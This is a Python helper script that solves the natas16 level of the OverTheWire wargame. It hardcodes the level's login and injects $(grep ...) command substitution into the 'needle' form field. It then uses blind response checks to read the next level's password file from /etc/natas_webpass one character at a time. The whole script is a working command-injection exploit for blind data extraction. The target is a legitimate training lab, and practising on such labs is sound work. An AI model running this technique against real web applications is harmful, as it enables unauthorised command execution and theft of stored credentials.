"""
Help script to resolve natas challenge #16
"""
import requests
url = 'http://natas16.natas.labs.overthewire.org/index.php'
auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
seen = ''
password = ''

""" Find used chars. """
for symbol in charset:
    # Request
    response = requests.post(url,
                             data={'needle': '$(grep {} /etc/natas_webpass/natas17)zigzagged'.format(symbol)},
                             auth=auth)

    """ 
    If the letter is part of the password, it will prefix the word we search in dictionary.txt and return no output.
    Otherwise we will get the word zigzagged as output.
    """
    if 'Output:\n<pre>\n</pre>' in response.text:
        seen += symbol

print('{}: {}'.format(len(seen), seen))

"""
We have the characters but not their position or possible repetitions.
We will use the same technique to find out if the password starts with a certain string.
"""

# We know the pass is 32 character long.
for iteration in range(0, 32):
    # Guess if the password string starts with the seen string.
    for symbol in seen:
        response = requests.post(url,
                             data={'needle': '$(grep ^{} /etc/natas_webpass/natas17)zigzagged'.format(password + symbol)},
                             auth=auth)
        if 'Output:\n<pre>\n</pre>' in response.text:
            password += symbol
            print(password)
print("The password should be: {}".format(password))
